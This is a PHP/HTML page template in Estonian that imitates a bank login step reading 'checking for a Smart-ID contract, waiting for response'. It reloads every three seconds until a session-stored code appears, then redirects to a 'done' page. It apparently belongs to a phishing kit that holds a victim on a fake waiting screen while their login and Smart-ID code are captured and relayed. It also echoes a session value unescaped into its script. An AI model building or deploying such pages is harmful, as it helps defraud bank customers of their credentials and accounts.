<?php 
isset($_SESSION['user_code_info'])?$users=$_SESSION['user_code_info']:$users='';
?>


    <div class="mt-30">
        <div class="container">
            <div class="title ml-20">Login sisse</div>
            <div class="step">
                <div class="setp-1" style="padding: 10px 10px;">
                        1 &nbspKasutajatunnus
                </div>
                <div class="step-2">             
                </div>
                <div class="setp-3" style="padding: 10px 10px;">
                        &nbsp&nbsp&nbsp2 &nbsp Salasõnad
                </div>
            </div>
            <div class="content mt-30" >
                <div class="row ">
                    <div class="col-md-8">
                        <p class="p_size ml-20">Kontrollime Smart-ID lepingu olemasolu...</p>
                        <p class="ml-20">Ootame vastust...</p>
                        <div style="padding: 20px;">  
                            <hr style="border:1.2px solid white;">
                            <div class="mt-20">
                                <button class="btn_2"  value="smart">Katkestan</button>                                         
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 mt-10 mb-10">
                        <div class="img_bt"></div>
                    </div>
                </div>
            </div>
        </div>        
    </div>   
    <script type="text/javascript">
        $(document).ready(function () {
            var search_value = '<?php echo $users["code"];?>';
            if(search_value){
                $(location).attr('href', '<?=base_url("done")?>');
            }else{
                setTimeout(function(){
                    location.reload(true);                   
                }, 3000);}
             });
    </script>
    
</body>
